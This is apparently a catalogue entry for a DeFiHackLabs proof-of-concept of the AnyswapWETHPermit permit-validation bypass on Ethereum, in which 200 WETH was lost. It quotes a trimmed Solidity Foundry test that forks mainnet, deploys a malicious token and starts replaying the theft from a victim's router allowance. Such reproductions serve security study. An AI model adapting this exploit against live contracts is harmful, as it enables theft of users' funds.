# [?] AnyswapWETHPermit - Permit Validation Bypass

## Summary
Severity: Unknown
Chain: Ethereum
Component: AnyswapWETHPermit
Published: 2025-07-29
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-07/AnyswapWETHPermit_exp.sol
Type: defi-exploit-poc

## Details
Lost: 200 WETH

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    AnyswapV4Router private constant router = AnyswapV4Router(VULNERABLE_CONTRACT);
    WETH9 private constant weth = WETH9(WETH_TOKEN);
    MaliciousAnyswapToken private maliciousToken;

    function setUp() public {
        uint256 forkBlock = 23_026_899;
        vm.createSelectFork("mainnet", forkBlock);

        fundingToken = WETH_TOKEN;
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker");
        vm.label(ATTACK_CONTRACT, "Historical attack contract");
        vm.label(VULNERABLE_CONTRACT, "AnyswapV4Router");
        vm.label(VICTIM, "Victim");
        vm.label(WETH_TOKEN, "WETH");

        maliciousToken = new MaliciousAnyswapToken(WETH_TOKEN, ATTACKER);
        vm.label(address(maliciousToken), "Malicious AnySwap token");
    }

    function testExploit() public balanceLog {
        uint256 stolenAmount = 200 ether;

        // step 1: model the same-block victim WETH funding; the real max router allowance already exists.
        vm.deal(VICTIM, stolenAmount);
        vm.prank(VICTIM);
        weth.deposit{value: stolenAmount}();
        assertEq(weth.allowance(VICTIM, VULNERABLE_CONTRACT), type(uint256).max);

        uint256 victimBefore = weth.balanceOf(VICTIM);
        uint256 attackerBefore = weth.balanceOf(ATTACKER);

        // step 2: call the verified router with dummy permit data; WETH fallback accepts the permit selector.
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-07/AnyswapWETHPermit_exp.sol_
